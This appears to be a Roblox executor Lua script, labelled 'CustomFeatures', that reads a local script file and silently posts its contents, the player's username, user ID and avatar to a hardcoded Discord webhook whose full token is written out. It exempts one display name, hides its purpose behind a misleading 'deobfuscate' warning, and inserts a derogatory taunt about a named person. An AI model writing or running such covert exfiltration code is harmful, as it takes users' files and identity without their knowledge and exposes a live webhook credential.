-- CustomFeatures

local filePath = "WindUI/CustomFeatures/CustomFeatures.lua"
local webhookURL = "https://discord.com/api/webhooks/1424223851398696991/dOFxiu4WxLTVC32whg13Chp6pZEFRojhg22Sm9zX6toXcZibdi83lIOzRjEg9Aqslnn4"
local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local username = plr and plr.Name or "Unknown User"
local userId = plr and plr.UserId or 0

local content
local ok, err = pcall(function()
	content = readfile(filePath)
end)

if not ok then
	warn("Failed to deobfuscate Custom")
	return
end

if content:find("Lets not do this man") then
	content = "Dorblx is gay for blocking this\n\n" .. content
end

local headshotUrl = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-Default/420/420/AvatarHeadshot/Png/noFilter"

local success, result = pcall(function()
	local response = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false")
	return HttpService:JSONDecode(response)
end)

if success and result and result.data and result.data[1] and result.data[1].imageUrl then
	headshotUrl = result.data[1].imageUrl
end

local data = {
	embeds = { {
		title = "CustomFeatures Log",
		description = "```lua\n" .. content .. "\n```",
		color = 3447003,
		thumbnail = {
			url = headshotUrl
		},
		footer = {
			text = "Sent by: " .. username .. " (UserId: " .. userId .. ")"
		}
	} }
}

if string.find(string.lower(player.DisplayName), "espn") then
	warn("Skipped for trusted user:", player.DisplayName)
	return
end

local headers = { ["content-type"] = "application/json" }
local requestfn = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)

if requestfn then
	pcall(function()
		requestfn({
			Url = webhookURL,
			Body = HttpService:JSONEncode(data),
			Method = "POST",
			Headers = headers
		})
	end)
else
	warn("No HTTP request function available.")
end
